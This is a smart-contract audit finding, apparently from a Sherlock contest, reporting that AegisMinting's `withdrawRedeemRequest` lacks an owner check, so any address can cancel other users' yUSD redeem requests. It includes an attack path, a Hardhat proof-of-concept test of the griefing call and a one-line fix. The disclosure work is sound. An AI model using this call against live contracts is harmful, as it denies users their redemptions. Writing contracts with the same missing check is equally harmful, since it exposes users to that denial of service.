# Missing Access Control In `AegisMinting::withdrawRedeemRequest()` Allows An Adversary To Withdraw Redeem Requests For Other Users

### Summary

A lack of access control or checks on msg.sender in `withdrawRedeemRequests` function could allow an adversary to withdraw any user's withdrawal requests. This can be a nuisance to real users who would like to redeem their `yUSD` in exchange for a specific collateral token. An attacker can repeatedly grief users by withdrawing all their redeem requests.

### Root Cause

https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisMinting.sol#L377-L390

`AegisMinting.sol:withdrawRequestRedeem` function lacks any access control mechanism to ensure `msg.sender` is the owner of the redeem request and saved as `request.order.userWallet`.

### Internal Pre-conditions

Victim user needs to make a redeem request.

### External Pre-conditions

None

### Attack Path

1. Victim mints yUSD by providing a collateral token.
2. Victim holds yUSD for a desirable amount of time.
3. Victim makes a redeem request for collateral. - Attacker sees this transaction.
4. Attacker withdraws victim's redeem requests.

This can happen over and over again as long as the attacker is able to withdraw the requests before being rejected or approved.

### Impact

Griefing
Denial of Service


### PoC

Add this test to `6_aegis_minting_redeem.spec.ts` test file, then run `npx hardhat test --grep "an adversary can withdraw redeem requests for other users"`

```typescript
      it('an adversary can withdraw redeem requests for other users', async () => {
        const [owner, sender, attacker] = await ethers.getSigners()

        const { aegisMintingContract, aegisMintingAddress, assetContract, assetAddress, yusdContract, aegisConfig } = await loadFixture(deployFixture)

        await aegisConfig['whitelistAddress(address,bool)'](sender, true)

        await yusdContract.setMinter(owner)
        await yusdContract.mint(sender, ethers.parseEther('100'))
        await yusdContract.setMinter(aegisMintingAddress)
        // Approve YUSD to be sent by AegisMinting contract from sender
        await yusdContract.connect(sender).approve(aegisMintingAddress, ethers.parseEther('1000'))
        
        const requestId = 'test'
        const yusdAmount = ethers.parseEther('9.99')
        const orderExpiry = (await time.latest()) + 10000
        const redeemOrder = {
          orderType: OrderType.REDEEM,
          userWallet: sender.address,
          collateralAsset: assetAddress,
          collateralAmount: ethers.parseEther('10'),
          yusdAmount: yusdAmount,
          slippageAdjustedAmount: yusdAmount,
          expiry: orderExpiry,
          nonce: Date.now(),
          additionalData: encodeString(requestId),
        }
        const signature = await signOrder(redeemOrder, aegisMintingAddress)
        await expect(aegisMintingContract.connect(sender).requestRedeem(redeemOrder, signature)).to.be.not.reverted
        
        await time.increase(orderExpiry)
        const benefactorYUSDBalanceBefore = await yusdContract.balanceOf(sender)

        await expect(aegisMintingContract.connect(attacker).withdrawRedeemRequest(requestId)).to.
          emit(aegisMintingContract, 'WithdrawRedeemRequest').
          withArgs(requestId, sender.address, yusdAmount)
        
        await expect(assetContract.balanceOf(aegisMintingAddress)).to.be.eventually.equal(0)
        await expect(yusdContract.balanceOf(sender)).to.be.eventually.equal(benefactorYUSDBalanceBefore + yusdAmount)
      })
```

### Mitigation

Add a check

```solidity
require(msg.sender == request.order.userWallet, "unAuthorized User");
```
